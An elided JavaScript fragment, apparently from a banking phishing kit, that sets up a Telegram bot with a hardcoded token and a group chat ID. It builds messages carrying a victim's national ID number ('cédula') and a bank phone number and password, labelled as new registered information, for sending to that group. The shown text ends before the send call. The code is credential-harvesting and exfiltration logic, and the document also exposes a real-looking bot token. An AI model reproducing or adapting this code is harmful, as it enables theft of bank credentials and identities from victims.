...
const bot = new Telebot({
    token:"6418922378:AAEgertZ_z8tDxC8dQDYvLrFCyAM0qj3uTg"
});
    ...
    try {
       ...
       if (cedula !== undefined) {
            function enviarCedula() {
                ...
                const chatId = -4082112022; //id de grupo
      ...
      //  Mandar Datos de Banco
       ...
       const ContraseñaBanco = usuario.contraseña

       if (Datosbanco, ContraseñaBanco !== undefined) {
            function enviarBanco() {
                //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
                const Banco = `Nueva Información de Registrada :\n` + 
                "Telefono: " + Datosbanco + `\n` + 
                "Contraseña: " + ContraseñaBanco
                ;
